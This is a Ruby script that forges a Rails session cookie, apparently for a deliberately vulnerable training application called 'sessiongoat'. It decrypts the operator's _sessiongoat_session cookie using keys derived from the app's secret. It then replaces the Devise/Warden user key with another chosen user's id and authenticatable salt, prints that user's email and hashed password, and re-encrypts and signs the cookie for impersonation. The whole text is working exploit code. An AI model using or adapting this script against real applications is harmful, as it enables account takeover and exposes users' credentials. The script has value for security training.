puts "Paste your encrypted session cookie value for _sessiongoat_session:\n"
encrypted_session_value = gets.chomp 

unescaped_content = CGI.unescape(encrypted_session_value)

secret = Rails.application.key_generator.generate_key('encrypted cookie')
sign_secret = Rails.application.key_generator.generate_key('signed encrypted cookie')

encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: JSON)
decrypted_hash = encryptor.decrypt_and_verify(unescaped_content)

puts "Decrypted hash is:\n\n #{decrypted_hash}\n\n"
puts "What user id would you like to modify instead of your own?\n"
new_user_id = gets.chomp.to_i
user = User.find(new_user_id)
authenticatable_salt = user.authenticatable_salt
decrypted_hash['warden.user.user.key'] = [[new_user_id], authenticatable_salt]

puts "\n\n***************************************\n\n"
puts "User with id #{new_user_id} and email address #{user.email} has hashed password #{user.encrypted_password} and authenticatable salt #{authenticatable_salt}\n\n"
puts "\n\n***************************************\n\n"
puts "Encrypting and signing hash:\n\n"
puts decrypted_hash 
puts "\n\n***************************************\n\n"
puts "Encrypted and signed cookie value for _sessiongoat_session:\n\n"
puts encryptor.encrypt_and_sign(decrypted_hash)
